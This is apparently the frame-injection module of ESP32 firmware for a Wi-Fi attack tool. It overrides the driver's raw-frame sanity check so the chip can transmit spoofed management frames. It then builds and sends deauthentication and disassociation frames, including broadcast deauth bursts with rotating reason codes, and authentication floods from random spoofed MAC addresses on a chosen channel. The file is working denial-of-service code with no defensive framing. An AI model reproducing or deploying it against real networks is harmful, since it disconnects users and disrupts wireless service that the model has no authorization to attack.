#include "frames.h"

#include <string.h>
#include <stdlib.h>

#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_rom_sys.h"

const uint8_t MAC_BROADCAST[MAC_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

#define FRAMES_PER_BURST   10
#define CHANNEL_SETTLE_US  2000

static const char *TAG = "frames";

/* Override weak symbol dari libnet80211.a */
int ieee80211_raw_frame_sanity_check(int32_t frame, int32_t len, int32_t flags)
{
    (void)frame; (void)len; (void)flags;
    return 0;
}

static volatile uint32_t s_tx_ok_count   = 0;
static volatile uint32_t s_tx_fail_count = 0;

uint32_t frames_get_tx_ok_count(void)   { return s_tx_ok_count; }
uint32_t frames_get_tx_fail_count(void) { return s_tx_fail_count; }
void     frames_reset_tx_counters(void) { s_tx_ok_count = 0; s_tx_fail_count = 0; }

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t reason[2];
} mgmt_reasoned_frame_t;

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t auth_alg[2];
    uint8_t auth_seq[2];
    uint8_t status[2];
} auth_frame_t;

static uint16_t s_seq = 0;

static inline uint16_t next_seq(void)
{
    s_seq = (s_seq + 1) & 0x0FFF;
    return s_seq;
}

static bool send_reasoned(uint8_t subtype, const uint8_t *da,
                          const uint8_t *bssid, uint16_t reason)
{
    mgmt_reasoned_frame_t f;
    f.frame_ctrl[0] = subtype;
    f.frame_ctrl[1] = 0x00;
    f.duration[0]   = 0x00;
    f.duration[1]   = 0x00;
    memcpy(f.da,    da,    6);
    memcpy(f.sa,    bssid, 6);
    memcpy(f.bssid, bssid, 6);

    uint16_t seq = next_seq() << 4;
    f.seq[0] = seq & 0xFF;
    f.seq[1] = (seq >> 8) & 0xFF;

    f.reason[0] = reason & 0xFF;
    f.reason[1] = (reason >> 8) & 0xFF;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
    if (err == ESP_OK) {
        s_tx_ok_count++;
        return true;
    }
    s_tx_fail_count++;
    if (s_tx_fail_count == 1) {
        ESP_LOGE(TAG, "esp_wifi_80211_tx FAILED (err=%d: %s).",
                 (int)err, esp_err_to_name(err));
    }
    return false;
}

void frames_send_deauth(const uint8_t *da, const uint8_t *bssid, uint16_t reason)
{
    send_reasoned(0xC0, da, bssid, reason);
}

void frames_send_disassoc(const uint8_t *da, const uint8_t *bssid, uint16_t reason)
{
    send_reasoned(0xA0, da, bssid, reason);
}

bool frames_send_deauth_broadcast(const uint8_t *bssid, uint16_t reason)
{
    return send_reasoned(0xC0, MAC_BROADCAST, bssid, reason);
}

void frames_send_auth_flood(const uint8_t *bssid)
{
    auth_frame_t f;
    f.frame_ctrl[0] = 0xB0;
    f.frame_ctrl[1] = 0x00;
    f.duration[0]   = 0x00;
    f.duration[1]   = 0x00;
    memcpy(f.da, bssid, 6);

    for (int i = 0; i < 6; i++) {
        f.sa[i] = (uint8_t)(esp_random() & 0xFF);
    }
    f.sa[0] = (f.sa[0] & 0xFC) | 0x02;

    memcpy(f.bssid, bssid, 6);

    uint16_t seq = next_seq() << 4;
    f.seq[0] = seq & 0xFF;
    f.seq[1] = (seq >> 8) & 0xFF;

    f.auth_alg[0] = 0x00;
    f.auth_alg[1] = 0x00;
    f.auth_seq[0] = 0x01;
    f.auth_seq[1] = 0x00;
    f.status[0]   = 0x00;
    f.status[1]   = 0x00;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
    if (err == ESP_OK) s_tx_ok_count++;
    else               s_tx_fail_count++;
}

static const uint16_t REASONS[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008};
#define REASONS_N (sizeof(REASONS) / sizeof(REASONS[0]))

static uint32_t burst_reasoned(uint8_t subtype, uint8_t channel,
                               const uint8_t *da, const uint8_t *bssid)
{
    esp_err_t ch_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGW(TAG, "set_channel(%u) failed: %d", channel, (int)ch_err);
        return 0;
    }
    esp_rom_delay_us(CHANNEL_SETTLE_US);

    uint32_t sent = 0;
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        if (send_reasoned(subtype, da, bssid, REASONS[i % REASONS_N])) {
            sent++;
        }
    }
    return sent;
}

uint32_t frames_burst_deauth(uint8_t channel, const uint8_t *da, const uint8_t *bssid)
{
    return burst_reasoned(0xC0, channel, da, bssid);
}

uint32_t frames_burst_disassoc(uint8_t channel, const uint8_t *da, const uint8_t *bssid)
{
    return burst_reasoned(0xA0, channel, da, bssid);
}

uint32_t frames_burst_auth_flood(uint8_t channel, const uint8_t *bssid)
{
    esp_err_t ch_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) return 0;
    esp_rom_delay_us(CHANNEL_SETTLE_US);

    uint32_t sent = 0;
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        uint32_t before = s_tx_ok_count;
        frames_send_auth_flood(bssid);
        if (s_tx_ok_count > before) sent++;
    }
    return sent;
}
